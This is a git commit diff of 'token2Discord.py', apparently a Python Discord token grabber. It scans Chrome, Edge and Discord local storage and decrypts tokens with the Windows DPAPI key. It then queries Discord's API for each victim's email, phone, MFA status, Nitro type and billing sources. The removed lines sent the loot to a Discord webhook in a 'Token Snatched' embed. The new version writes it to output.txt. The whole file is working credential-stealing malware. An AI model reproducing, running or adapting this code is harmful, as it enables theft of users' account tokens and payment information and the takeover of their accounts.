80e70bdf459b419fe308c0f89ed2ca9c37e770f1
Charles The Great <27988707+CharlesTheGreat77@users.noreply.github.com>
2023-08-02 10:15:17 -0700

    Update token2Discord.py

--- token2Discord.py
+++ token2Discord.py
@@ -1,4 +1,5 @@
-import requests, re, os, json
+import requests, os, json
+import re
 from json import loads, dumps
 from datetime import datetime
 from urllib.request import Request, urlopen
@@ -6,10 +7,9 @@ from base64 import b64decode
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
+
 class token2Discord:
     def __init__(self):
-        self.WEBHOOK = '%WEBHOOK%'
-        self.embed = []
         self.tokens = []
         self._ROAMING = os.getenv('APPDATA')
         self._LOCAL = os.getenv('LOCALAPPDATA')
@@ -21,30 +21,6 @@ class token2Discord:
             'Chrome': self._LOCAL + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
             'Microsoft Edge': self._LOCAL + r'\\Microsoft\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
         }
-
-
-    def main(self):
-        # steal tokens function
-        self.steal(path)
-        if len(tokens) > 0:
-            # if tokens were found, validate all tokens
-            for token in self.tokens:
-                userData = self.validate(token)
-                # if user data was found, extract data
-                if userData != None:
-                    username, discordId, phone, email, mfa, nitro, billing = self.extract(userData, token)
-                    # construct message
-                    message = {
-        "fields": [
-            {"name": "[Token Snatched]", "value": f"Token: {token} | Platform: {platform}", "inline": True},
-            {"name": "User Information:", "value": f"Email/Phone Number: {email}:{phone}\nNitro Subscription: {nitro}\nBilling: {billing}", "inline": False},
-    ],
-        "Victim": {"name": f"{username}{discordId}"}
-}
-                    self.embed.append(message)
-                    # send data to discord
-                    self.discordSend()
-
 
     def decryptToken(self, encrypted, key):
         try:
@@ -58,17 +34,15 @@ class token2Discord:
             return "Failed to decrypt token"
 
     def getKey(self):
-        with open(self._ROAMING+'\\discord\\Local State', "r", encoding="utf-8", errors="ignore") as f:
+        with open(self._ROAMING + '\\discord\\Local State', "r", encoding="utf-8", errors="ignore") as f:
             local_state = f.read()
         local_state = json.loads(local_state)
-
         master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
-    
 
-    def steal(self):
+    def tokenization(self):
         for _, path in self._PATHS.items():
             if not os.path.exists(path):
                 continue
@@ -78,7 +52,7 @@ class token2Discord:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                            for token in findall(regex, line):
+                            for token in re.findall(regex, line):
                                 self.tokens.append(token)
             else:
                 if os.path.exists(self._ROAMING + '\\discord\\Local State'):
@@ -86,10 +60,9 @@ class token2Discord:
                         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for y in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                            for y in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                 token = self.decryptToken(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.getKey())
                                 self.tokens.append(token)
-
 
     def validate(self, token):
         try:
@@ -100,7 +73,6 @@ class token2Discord:
                 userData = None
         except Exception:
             userData = None
-
         return userData
 
     def extract(self, userData, token):
@@ -108,22 +80,27 @@ class token2Discord:
         discordId = userData['id']
         phone = userData['phone']
         email = userData['email']
+
+        mfa = "Unknown"
         try:
             if userData['mfa_enabled']:
                 mfa = "Enabled"
             else:
                 mfa = "Disabled"
         except Exception:
-                mfa = "Unknown"
+            pass
+
+        nitro = 'None'
         try:
             if userData['premium_type'] == 1:
                 nitro = 'Nitro Classic'
             elif userData['premium_type'] == 2:
                 nitro = 'Nitro Boost'
         except BaseException:
-                nitro = 'None'
+            pass
 
         billResponse = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={'Authorization': token}).json()
+        billing = "Unknown"
         if len(billResponse) > 0:
             try:
                 for billing in billResponse:
@@ -134,25 +111,32 @@ class token2Discord:
                     else:
                         billing = "Unknown"
             except Exception:
-                billing = "Unknown"
-        else:
-                billing = 'None'
-
+                pass
         return username, discordId, phone, email, mfa, nitro, billing
 
-    def discordSend(self):
-        headers = {
-            'Content-Type': 'application/json',
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-        }
-        webhook = {
-            "content": "",
-            "embeds": self.embed,
-        }
-        try:
-            urlopen(Request(self.WEBHOOK, data=dumps(webhook).encode(), headers=headers))
-        except Exception as msg:
-            pass
+    def get_valid_tokens(self):
+        tokenz = list(set(self.tokens))
+        return tokenz
 
-grab = token2Discord()
-grab.main()
+def main():
+    grab = token2Discord()
+    # steal tokens function
+    grab.tokenization()
+    tokens = grab.get_valid_tokens()
+    if len(tokens) > 0:
+    # if tokens were found, validate all tokens
+        for token in tokens:
+            userData = grab.validate(token)
+            # if data found, exctract
+            if userData != None:
+                 username, discordId, phone, email, mfa, nitro, billing = grab.extract(userData, token)
+                 # construct message
+                 message = f"Token: {token}\nEmail: {email} / Phone#: {phone}\nNitro: {nitro}\nBilling: {billing}"
+                 export_file(message)
+
+def export_file(message):
+        with open('output.txt', 'w') as file:
+            file.write(message)
+
+
+main()
